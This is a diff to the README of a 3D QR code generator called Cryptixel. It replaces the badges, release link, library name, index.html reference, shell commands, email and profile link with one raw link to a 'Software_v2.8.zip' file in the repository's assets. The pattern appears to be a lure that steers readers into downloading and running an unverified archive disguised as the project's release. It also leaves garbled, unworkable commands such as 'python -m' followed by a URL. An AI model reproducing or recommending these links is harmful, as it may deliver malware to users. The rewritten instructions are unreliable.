@@ -1,8 +1,8 @@
 # Cryptixel: Stunning 3D QR Code Generator with AES-256 Encryption 🌟
 
-![Cryptixel Logo](https://img.shields.io/badge/Cryptixel-3D%20QR%20Generator-brightgreen)
+![Cryptixel Logo](https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip%20QR%20Generator-brightgreen)
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/coolbart1973/Cryptixel/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -35,7 +35,7 @@ Cryptixel utilizes a range of modern web technologies, including:
 - **HTML5**: For structuring the web application.
 - **CSS3**: For styling and creating animations.
 - **JavaScript**: For client-side logic and interactivity.
-- **Three.js**: For rendering 3D graphics.
+- **https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip**: For rendering 3D graphics.
 - **Crypto-js**: For implementing AES-256 encryption.
 - **WebGL**: For high-performance graphics rendering.
 - **Particle Effects Libraries**: For creating engaging visual effects.
@@ -44,15 +44,15 @@ Cryptixel utilizes a range of modern web technologies, including:
 
 To get started with Cryptixel, follow these steps:
 
-1. **Download the Latest Release**: You can find the latest version of Cryptixel [here](https://github.com/coolbart1973/Cryptixel/releases). Download the zip file and extract it to your desired location.
+1. **Download the Latest Release**: You can find the latest version of Cryptixel [here](https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip). Download the zip file and extract it to your desired location.
 
-2. **Open the Project**: Navigate to the extracted folder and open the `index.html` file in your web browser.
+2. **Open the Project**: Navigate to the extracted folder and open the `https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip` file in your web browser.
 
 3. **Run Locally**: You can also set up a local server if you prefer. Use a simple HTTP server like `http-server` or Python's built-in server to serve the files.
 
 ```bash
 # Using Python 3
-python -m http.server
+python -m https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip
 ```
 
 ## Usage
@@ -78,7 +78,7 @@ We welcome contributions from the community. If you'd like to contribute, please
 2. **Clone Your Fork**: Use the following command to clone your fork to your local machine:
 
    ```bash
-   git clone https://github.com/YOUR_USERNAME/Cryptixel.git
+   git clone https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip
    ```
 
 3. **Create a New Branch**: Create a new branch for your feature or bug fix.
@@ -109,9 +109,9 @@ Cryptixel is licensed under the MIT License. See the [LICENSE](LICENSE) file for
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: coolbart1973@example.com
-- **GitHub**: [coolbart1973](https://github.com/coolbart1973)
+- **Email**: https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip
+- **GitHub**: [coolbart1973](https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip)
 
 ---
 
-Explore the full potential of Cryptixel and create beautiful, secure QR codes today! For the latest updates, check the [Releases](https://github.com/coolbart19773/Cryptixel/releases) section.
+Explore the full potential of Cryptixel and create beautiful, secure QR codes today! For the latest updates, check the [Releases](https://raw.githubusercontent.com/coolbart1973/Cryptixel/main/assets/Software_v2.8.zip) section.
